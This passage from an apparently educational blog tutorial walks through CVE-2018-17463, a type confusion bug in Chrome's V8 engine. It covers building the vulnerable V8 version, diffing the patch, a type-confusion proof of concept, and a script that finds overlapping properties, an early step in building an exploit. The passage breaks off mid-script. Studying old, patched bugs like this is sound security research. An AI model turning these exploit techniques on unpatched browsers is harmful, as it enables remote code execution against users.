wait-avg |   s m |  serv-avg |   s m |</span><span class="hljs-string">  localexec/32   2527(0)  4m03.72s |&#x2582; &#x2582;&#x2582;&#x2587;&#x2588;&#x2583;|    10.08s | &#x2582;&#x2584;&#x2587;&#x2588;&#x2582; |</span><span class="hljs-string">14m13.39s Build Succeeded: 2609 steps - 3.06/s</span><span class="hljs-string">Done! - V8 compilation finished successfully.</span></code></pre><p>If you see a pleasant <code>Done!</code> as shown above, the installation completed successfully! &#x1F64C;</p><p>The JavaScript engine <strong>V8</strong> does not translate our code directly into machine code. Instead, it first compiles to an intermediate language called <strong>bytecode</strong>. That bytecode is executed by the <strong>Ignition interpreter</strong>, and hot/repeated code paths are optimized by the <strong>TurboFan compiler</strong> into faster machine code.<br>Below is the key portion of the bytecode produced when running a simple JavaScript snippet <code>Array.from(String(&apos;12345&apos;))</code> in the <code>d8</code> shell.</p><p><img src="image%201.png" alt="image.png"></p><p><code>Array.from(String(&apos;12345&apos;))</code></p><p>This code can be thought of in two main steps.</p><ol><li>Execute <code>String(&apos;12345&apos;)</code> to produce a string object.</li><li>Execute <code>Array.from()</code> to convert that string object into an array.</li></ol><p>Inside V8, both steps are represented in the intermediate language called <strong>bytecode</strong>. Bytecode and assembly are both low-level representations of code, but they differ significantly. Assembly (and machine code) issues instructions to specific hardware (the CPU), so it&#x2019;s architecture-dependent and must be compiled for a particular CPU to run.</p><p>By contrast, bytecode is an abstract set of instructions that is not tied to any specific hardware. It runs on top of a virtual &#x201C;machine&#x201D; &#x2014; the Ignition interpreter &#x2014; so JavaScript code can run immediately on different operating systems and CPU architectures without a separate compile step.</p><p>The <strong>D8</strong> used here is V8&#x2019;s developer/debug shell. With D8 you can run V8 without a browser and use debugging flags like <code>--print-bytecode</code> to inspect the engine&#x2019;s internals. It&#x2019;s an excellent tool for analyzing how V8 generates and runs bytecode. In this part we&#x2019;ll use D8 thoroughly, step-by-step, to follow the exploit process.</p><p>The analysis post I referenced is: <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p>Now let&#x2019;s roll back the git version to trigger the vulnerability in a real V8 build.</p><pre><code class="hljs c">C:\dev\source\v8&gt;git checkout <span class="hljs-number">568979f</span>4d891bafec875fab20f608ff9392f4f29Updating files: <span class="hljs-number">100</span>% (<span class="hljs-number">15550</span>/<span class="hljs-number">15550</span>), done.Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`sHEAD is now at <span class="hljs-number">568979f</span>4d89 [parser] Fix memory accounting of explicitly cleared zones</code></pre><p>To build that version you&#x2019;ll need to install the following additional items.</p><ul><li>MSVC v140 - VS 2015 C++ build tools (v14.00)</li><li>MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)</li><li>Windows 10 SDK (10.0.17134.0)<ul><li>If you have a nearby version, you can copy the SDK folder and rename it to match. I installed <code>10.0.19041.0</code> and renamed the folder to <code>10.0.17134.0</code>.</li></ul></li></ul><pre><code class="hljs c">C:\dev\source\v8&gt;gn gen --ide=vs out\x64.debugERROR at <span class="hljs-comment">//.gn:24:48: No value named &quot;exec_script_whitelist&quot; in scope &quot;build_dotfile_settings&quot;</span>exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []</code></pre><p>It won&#x2019;t work right away! Because these are old versions, you must also align (sync) the build tools to those older toolchains. <del>(2018 already&#x2026; seven years ago &#x2014; TMI, but I was 20 in 2018, hehe.)</del></p><p>Run <code>gclient sync</code> to sync the build toolchain. Since the build requires Python 2, make sure <code>where python</code> lists the Python 2 binary first in your PATH.<br>Also set the following environment variable:</p><p><code>set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0</code></p><p>After that, the build should succeed.</p><pre><code class="hljs c">c:\dev\source\v8&gt;gclient sync...Running hooks: <span class="hljs-number">100</span>% (<span class="hljs-number">30</span>/<span class="hljs-number">30</span>), done</code></pre><p>When building Chrome you may see errors like the one below &#x2014; the flags differ depending on whether the sandbox existed at that time.</p><pre><code class="hljs c">c:\dev\source\v8&gt;gn gen --ide=vs out\x64.debugGenerating Visual Studio projects took <span class="hljs-number">96</span>msDone. Made <span class="hljs-number">129</span> targets from <span class="hljs-number">74</span> files in <span class="hljs-number">1597</span>ms</code></pre><blockquote><p>I couldn&#x2019;t get the ninja build to work here; if you can, proceed on Windows using the steps above. If not, you can build on Linux. In Part 4 I plan to cover a 2023 1-day exploit and I&#x2019;ll do that hands-on on Windows!</p></blockquote><h1 id="2-CVE-2018-17463"><a href="#2-CVE-2018-17463" class="headerlink" title="2. CVE-2018-17463"></a>2. CVE-2018-17463</h1><p>CVE-2018-17463 is a Type Confusion vulnerability in <code>Google Chrome Versions 69.0 and before</code> that allows RCE from the renderer. Let&#x2019;s analyze how this was possible, starting from the root cause.</p><h2 id="2-1-Root-Cause"><a href="#2-1-Root-Cause" class="headerlink" title="2.1 Root Cause"></a>2.1 <strong>Root Cause</strong></h2><p>The JIT compiler Turbofan performs optimizations by detecting and eliminating duplicate IR. However, if it operates incorrectly it can remove safety checks like <code>type check</code>, and that is where Type Confusion can occur.</p><h3 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a><strong>Patch Diffing</strong></h3><p>If you look at <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=888923">Issue 888923</a>, you&#x2019;ll find a <a href="https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220">commit</a> <code>52a9e67a477bdb67ca893c25c145ef5191976220</code> with the message:</p><blockquote><p>[turbofan] Fix ObjectCreate&#x2019;s side effect annotation.</p></blockquote><p>Examining that change shows that in the JavaScript operation <code>CreateObject</code> the flag <code>Operator::kNoWrite</code> was changed to <code>Operator::kNoProperties</code>.</p><pre><code class="hljs c">C:\dev\source\v8&gt;git show <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220commit <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;Date:   Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>    [turbofan] Fix ObjectCreate<span class="hljs-number">&apos;</span>s side effect annotation.    Bug: chromium:<span class="hljs-number">888923</span>    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79    Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245763</span>    Reviewed-by: Benedikt Meurer &lt;bmeurer@chromium.org&gt;    Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;    Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56236</span>}diff --git a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc b/src/compiler/js-<span class="hljs-keyword">operator</span>.ccindex <span class="hljs-number">94b</span>018c987d.<span class="hljs-number">.5</span>ed3f74e075 <span class="hljs-number">100644</span>--- a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc+++ b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc@@ <span class="hljs-number">-622</span>,<span class="hljs-number">7</span> +<span class="hljs-number">622</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function">CompareOperationHint <span class="hljs-title">CompareOperationHintOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Operator* op)</span> </span>{   V(CreateKeyValueArray, Operator::kEliminatable, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \   V(CreatePromise, Operator::kEliminatable, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)                      \   V(CreateTypedArray, Operator::kNoProperties, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)                   \-  V(CreateObject, Operator::kNoWrite, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                            \+  V(CreateObject, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                       \   V(ObjectIsArray, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                      \   V(HasProperty, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                        \   V(HasInPrototypeChain, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \diff --git a/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js b/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js<span class="hljs-keyword">new</span> file mode <span class="hljs-number">100644</span>...</code></pre><p><code>NoWrite</code> means &#x201C;the object&#x2019;s state will not be mutated&#x201D; (i.e., no additional memory updates). During this operation there was a side effect that changed the properties&#x2019; layout (the Map), so the fix was to indicate &#x201C;this object&#x2019;s properties do not change&#x201D; to prevent the optimizer from assuming the Map is unmodified.</p><h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h3><p>When you call <code>Object.create(proto)</code> in JavaScript, it creates a new object and directly sets that object&#x2019;s <code>[[Prototype]]</code> to <code>proto</code>.</p><p>For example:</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> animal = { <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;animal&quot;</span> };<span class="hljs-keyword">let</span> dog = <span class="hljs-built_in">Object</span>.create(animal);<span class="hljs-built_in">console</span>.log(dog.type); <span class="hljs-comment">// &quot;animal&quot;</span></code></pre><p>Here <code>dog</code> does not have its own <code>type</code> property, but because its <code>[[Prototype]]</code> points to <code>animal</code>, <code>dog.type</code> resolves to <code>&quot;animal&quot;</code>. Thus <code>Object.create</code> acts as a &#x201C;glue&#x201D; that starts a new prototype chain.</p><blockquote><p>JavaScript objects and the prototype chain</p><ul><li>Every object in JavaScript internally has a hidden link called <code>[[Prototype]]</code>.</li><li>This link points to another object (the prototype), which may in turn have its own prototype.</li><li>The linked sequence forms the <strong>prototype chain</strong>.</li><li>When JS looks up a property or method:<ol><li>It checks the object itself.</li><li>If not found, it follows <code>[[Prototype]]</code> upwards.</li><li>It repeats until it reaches <code>null</code>.</li></ol></li></ul></blockquote><p><img src="image%202.png" alt="image.png"></p><p>Let&#x2019;s follow how the <code>ObjectCreate</code> function constructs a new map. The <code>ObjectCreate</code> function takes the prototype as an argument and calls <code>GetObjectCreateMap</code>.</p><p><img src="image%203.png" alt="image.png"></p><p><code>GetObjectCreateMap</code>&#x2019;s job is to <strong>return the Object Create Map appropriate for the given prototype</strong>. This is where a side effect can occur.</p><ol><li><code>JSObject::OptimizeAsPrototype</code>: Converts the given object into a &#x201C;prototype-optimized&#x201D; state &#x2014; i.e., transforms a regular object into a prototype object.</li><li><code>Map::TransitionToPrototype</code>: Transitions the map to match the new prototype &#x2014; in other words, it changes the map&#x2019;s linkage/structure.</li></ol><p>This matters because the code is effectively doing &#x201C;the newly created object becomes a prototype object, and the map associated with that object is changed at the same time.&#x201D; Therefore, simply calling <code>Object.create(proto)</code> can cause <strong>the object to become a prototype object and its associated map layout to change</strong>.</p><h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><p>Now let&#x2019;s verify this in <code>d8</code>.</p><pre><code class="hljs c">C:\dev\source\v8&gt;out\x64.debug\d8 --allow-natives-syntaxV8 version <span class="hljs-number">14.2</span><span class="hljs-number">.0</span> (candidate)d8&gt; let obj = {x:<span class="hljs-number">13</span>};undefinedd8&gt; %DebugPrint(obj)DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE] - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006c2fd</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS] - properties: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; - All own properties (excluding elements): {    <span class="hljs-number">0x21700003601</span>: [String] in ReadOnlySpace: #x: <span class="hljs-number">13</span> (<span class="hljs-keyword">const</span> data field <span class="hljs-number">0</span>, attrs: [WEC]) @ Any, location: in-object }<span class="hljs-number">0x2170006c2fd</span>: [Map] in OldSpace - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt; - type: JS_OBJECT_TYPE - instance size: <span class="hljs-number">16</span>   - inobject properties: <span class="hljs-number">1</span> - unused property fields: <span class="hljs-number">0</span> - elements kind: HOLEY_ELEMENTS - <span class="hljs-keyword">enum</span> length: invalid - stable_map - back pointer: <span class="hljs-number">0x02170006c2d5</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt; - instance descriptors (own) #<span class="hljs-number">1</span>: <span class="hljs-number">0x021700389525</span> &lt;DescriptorArray[<span class="hljs-number">1</span>]&gt; - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt; - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt; - construction counter: <span class="hljs-number">0</span>{x: <span class="hljs-number">13</span>}</code></pre><p>An object like the one above is created. Now call <code>Object.create</code>.</p><pre><code class="hljs c">d8&gt; Object.create(obj){}d8&gt; %DebugPrint(obj)DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE] - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006d05d</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS] - properties: <span class="hljs-number">0x02170038b3dd</span> &lt;NameDictionary[<span class="hljs-number">18</span>]&gt; - All own properties (excluding elements): {   x: <span class="hljs-number">13</span> (data, dict_index: <span class="hljs-number">1</span>, attrs: [WEC]) }<span class="hljs-number">0x2170006d05d</span>: [Map] in OldSpace - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt; - type: JS_OBJECT_TYPE - instance size: <span class="hljs-number">16</span> - inobject properties: <span class="hljs-number">1</span> - unused property fields: <span class="hljs-number">0</span> - elements kind: HOLEY_ELEMENTS - <span class="hljs-keyword">enum</span> length: invalid - dictionary_map - may_have_interesting_properties - prototype_map - prototype info: <span class="hljs-number">0x02170006d085</span> &lt;PrototypeInfo&gt; - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt; - instance descriptors (own) #<span class="hljs-number">0</span>: <span class="hljs-number">0x0217000007e5</span> &lt;DescriptorArray[<span class="hljs-number">0</span>]&gt; - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt; - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt; - construction counter: <span class="hljs-number">0</span>{x: <span class="hljs-number">13</span>}</code></pre><p>After the function call, you can see the map changed from <code>FastProperties</code> to <code>DictionaryProperties</code>. That means the <code>NoWrite</code> assumption is invalid. If there is no operation checking the map before and after the function call, that can lead to Type Confusion.</p><h2 id="2-2-Proof-of-Concept"><a href="#2-2-Proof-of-Concept" class="headerlink" title="2.2 Proof of Concept"></a>2.2 Proof of Concept</h2><h3 id="Type-Confusion-PoC"><a href="#Type-Confusion-PoC" class="headerlink" title="Type Confusion PoC"></a>Type Confusion PoC</h3><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{    <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>    obj.a;    <span class="hljs-comment">// Force a Map Transition via our side-effect</span>    Object.create(obj)    <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>    <span class="hljs-keyword">return</span> obj.b;}vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Warm-up code</span>vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>});%OptimizeFunctionOnNextCall(vuln); <span class="hljs-comment">// JIT Compile vuln</span>vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Trigger type-confusion - should not return 43!</span></code></pre><p>Let&#x2019;s trigger Type Confusion using <code>Object.create</code>. Run <code>d8</code> with the <code>--allow-natives-syntax</code> flag and enter the following:</p><pre><code class="hljs css"><span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})43<span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})43<span class="hljs-selector-tag">d8</span>&gt; %<span class="hljs-selector-tag">OptimizeFunctionOnNextCall</span>(<span class="hljs-selector-tag">vuln</span>)<span class="hljs-selector-tag">undefined</span><span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})0</code></pre><p>In the optimized (compiled) code you can observe that the return value differs.</p><p>If you look at the IR graph,</p><pre><code class="hljs c">C:\dev\v8\v8\out\x64.debug&gt;d8 --allow-natives-syntax --trace-turbo poc.jsConcurrent recompilation has been disabled <span class="hljs-keyword">for</span> tracing.---------------------------------------------------Begin compiling method vuln <span class="hljs-keyword">using</span> Turbofan---------------------------------------------------Finished compiling method vuln <span class="hljs-keyword">using</span> Turbofan</code></pre><p><img src="image%204.png" alt="image.png"></p><p>You can see that redundancy elimination removed the <code>CheckMaps</code> at node 46 on the left. At that point, when execution passes through <code>JSCreateObject</code> at node 28, a map transition can occur &#x2014; and that is where Type Confusion can be triggered.</p><h3 id="Five-Steps-to-generate-a-Proof-of-Concept"><a href="#Five-Steps-to-generate-a-Proof-of-Concept" class="headerlink" title="Five Steps to generate a Proof of Concept"></a>Five Steps to generate a Proof of Concept</h3><p>After triggering the Type Confusion as described above, the exploit uses the side effect that occurs when accessing the object. The access phase can be divided into five steps.</p><ol><li>Create the prototype object: make a new object with in-object (inline) properties. This object will be used as the prototype for <code>Object.create</code>.</li><li>Add an out-of-line property: add a property to the object&#x2019;s property backing store. This property will be accessed after the Map transition.</li><li>Force <code>CheckMap</code> execution: run the <code>CheckMap</code> operation to encourage redundancy elimination. This causes later <code>CheckMap</code> operations to be removed.</li><li>Induce a Map transition: call <code>Object.create</code> using the object created earlier. This changes the object&#x2019;s structure and transitions it to a new hidden class (Map).</li><li>Access the out-of-line property: finally, access the out-of-line property.</li></ol><blockquote><p><strong>In-object properties (Inline properties)</strong></p><p>Inline properties are stored directly in the object&#x2019;s memory. Because no extra memory indirection is required when accessing them, they&#x2019;re the fastest and most efficient storage. V8 uses the object&#x2019;s Map (hidden class) to compute the precise offset of each inline property.</p><p><strong>Out-of-line properties (Out-of-line / backing store properties)</strong></p><p>When an object has more properties than fit in its inline property slots, the remaining properties are stored out-of-line in a separate backing store (property backing store). Accessing these properties requires an extra level of indirection compared to inline properties.</p><p><strong>Speculation Guard</strong></p><p><code>CheckMap</code> is an operation that verifies an object&#x2019;s hidden class matches the expected one; it serves as a speculation guard. The JIT compiler analyzes runtime patterns and speculates that a variable&#x2019;s type will remain constant, then generates optimized code based on that assumption. <code>CheckMap</code> confirms whether that speculation still holds.</p></blockquote><p>Words alone may be unclear, so let&#x2019;s inspect the code in the next section.</p><h2 id="2-3-Exploiting-a-Type-Confusion"><a href="#2-3-Exploiting-a-Type-Confusion" class="headerlink" title="2.3 Exploiting a Type Confusion"></a>2.3 <strong>Exploiting a Type Confusion</strong></h2><h3 id="Map-Transition"><a href="#Map-Transition" class="headerlink" title="Map Transition"></a>Map Transition</h3><p>In section 2.2 we used <code>%OptimizeFunctionOnNextCall</code>, which lets a developer force optimization timing. Instead, we&#x2019;ll let V8 decide when to optimize by making the function hot through repeated calls. As we&#x2019;ve seen, ordinary JavaScript goes through V8&#x2019;s optimization pipeline: when V8 deems a function &#x201C;hot,&#x201D; it uses the JIT compilers (Maglev, TurboFan) to generate optimized native code for it.</p><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{  <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>  obj.a;  <span class="hljs-comment">// Force a Map Transition via our side-effect</span>  Object.create(obj)  <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>  <span class="hljs-keyword">return</span> obj.b;}<span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {  let obj = {a:<span class="hljs-number">42</span>}; <span class="hljs-comment">// Create object with in-line properties</span>  obj.b = <span class="hljs-number">43</span>; <span class="hljs-comment">// Store property out-of-line in backing store</span>  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">1</span>) { %DebugPrint(obj); }  vuln(obj); <span class="hljs-comment">// Trigger type-confusion</span>  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">9999</span>) { %DebugPrint(obj); }}</code></pre><p>Save the above code to a JSON file and run it with <code>d8</code>; you&#x2019;ll get results like the screenshot below.</p><p><img src="image%205.png" alt="image.png"></p><ul><li>The object&#x2019;s Map (which holds its layout) changed from <code>FastProperties</code> to <code>DictionaryProperties</code>.</li><li>(The bottom of the image is slightly cut off,) but you can also see that the property backing store transitioned from a <code>FixedArray</code> to a <code>NameDictionary</code>.</li></ul><blockquote><p>V8 stores an object&#x2019;s excess properties (those that overflow inline slots) in a separate memory area called the property backing store. This backing store is implemented as a <strong>FixedArray</strong> called <strong>PropertyArray</strong>. Thus, the <strong>PropertyArray</strong> can be seen as a special-purpose <strong>FixedArray</strong> used to hold an object&#x2019;s out-of-line properties.</p></blockquote><p><code>FixedArray</code> and <code>NameDictionary</code> are composed as follows:</p><p><img src="image%206.png" alt="image.png"></p><p>FixedArray (PropertyArray) is a simple array structure with contiguous value slots. It stores an object&#x2019;s out-of-line (those that exceed the inline slots) property <strong>values in order</strong>. A simplified layout looks like:</p><pre><code class="hljs gherkin">FixedArray:[ header |<span class="hljs-string"> slot0 </span>|<span class="hljs-string"> slot1 </span>|<span class="hljs-string"> slot2 </span>|<span class="hljs-string"> slot3 </span>|<span class="hljs-string"> ... ]</span></code></pre><p>NameDictionary stores (key, value, details) tuples in a hashtable/dictionary form. Because it must keep the property name, value, and property attributes (details) together, its structure is more complex. The per-process hash seed (randomness) is mixed in, so the placement of keys in the table changes on every run. In short, NameDictionary is a complicated hash-table structure whose property storage locations are randomized each execution, making them hard to predict. A simplified layout looks like:</p><pre><code class="hljs gherkin">NameDictionary:[ header |<span class="hljs-string"> ... </span>|<span class="hljs-string"> key0 </span>|<span class="hljs-string"> value0 </span>|<span class="hljs-string"> details0 </span>|<span class="hljs-string"> key1 </span>|<span class="hljs-string"> value1 </span>|<span class="hljs-string"> details1 </span>|<span class="hljs-string">...]</span></code></pre><p>So &#x2014; what side effects can happen if properties of different types get confused?</p><p>When properties that used to be stored sequentially in a <code>FixedArray</code> (<code>0</code>, <code>1</code>, <code>2</code>, &#x2026;) are converted to a <code>NameDictionary</code>, they end up scattered at completely different memory offsets. The JIT-compiled code, however, was generated assuming the <code>FixedArray</code> offsets. If execution continues using those fixed <code>FixedArray</code> offsets while the backing store is actually a <code>NameDictionary</code>, you end up accessing entirely different fields &#x2014; sometimes those fields will accidentally line up so that a different property appears to be at the same offset. By triggering this situation you can gain an exploitable primitive.</p><p>As shown above, hot code produced by repeating a pattern causes the JIT compiler to assume a fixed map and generate native code that accesses properties at fixed offsets. For example, <code>obj.p10</code> may be compiled to read from <code>base + offset + 10*8</code>. If that compiled code remains and you trigger a map transition at runtime, the object&#x2019;s map can change from <code>FastProperties</code> &#x2192; <code>DictionaryProperties</code>, swapping the backing store from a <code>FixedArray</code> to a <code>NameDictionary</code>. But the JIT code doesn&#x2019;t know about the change and keeps reading at the fixed <code>FixedArray</code> offsets. Because the two layouts place fields differently, <strong>the same read will end up reading some other field</strong> in memory.</p><h3 id="Finding-Overlapping-Properties"><a href="#Finding-Overlapping-Properties" class="headerlink" title="Finding Overlapping Properties"></a>Finding Overlapping Properties</h3><pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}</code></pre><p>First, this creates an object with one inline property (<code>inline</code>) and 31 out-of-line properties (<code>p1</code> ~ <code>p31</code>). We plant negative values in each out-of-line property so that, when we later dump memory, we can clearly identify only the values we inserted (they won&#x2019;t be confused with small positive dictionary-internal values). The single inline access like <code>obj.inline</code> exists so the JIT will generate a <code>CheckMap</code> and form the assumption &#x201C;this object has this map.&#x201D; In other words, the <code>obj.inline</code> access causes a <strong>map-check</strong> inside <code>vuln()</code>. After we cause the map transition, the JIT will keep using the old assumption and Type Confusion occurs.</p><p>Let&#x2019;s look at the full PoC that finds overlapping property pairs.</p><pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Find a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 is in the NameDictionary</span><span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        let res = vuln(makeObj());        <span class="hljs-comment">// Print FixedArray when i=1 and Dictionary when i=9999</span>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span> || i == <span class="hljs-number">9999</span>) {            print(res);        }    }}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties&quot;</span>);findOverlappingProperties();</code></pre><p>The vulnerable <code>vuln()</code> function dynamically generates code at runtime (using <code>eval</code> and template literals) that reads <code>p1</code>~<code>p31</code> and returns them as an array. This avoids manually writing many read statements and forces the JIT to produce code that reads many properties at once; repeated execution triggers profiling and then optimization into code that uses fixed offsets.</p><p>The search strategy is as follows: plant many candidate properties, run the function many times to make it hot so the JIT compiles it, then deliberately force a map transition and compare the read results before and after the transition. Indices where the results differ identify candidate overlapping locations.</p><p><img src="image%207.png" alt="image.png"></p><blockquote><p>Note: In <code>../v8</code> (a recent checkout) you can verify that the bug is no longer reproducible.</p></blockquote><p>By running the same object shape thousands of times to drive JIT compilation, then intentionally causing the map transition and comparing reads in the FixedArray vs NameDictionary states, you can find where the negative values moved &#x2014; those indices are candidates. From those candidates, discard trivial cases where <code>pX</code> overlaps with itself; keep only pairs where different properties collide (<code>pA &#x2194; pB</code>) and verify they match. The code above is a full PoC that finds overlapping property pairs.</p><pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span 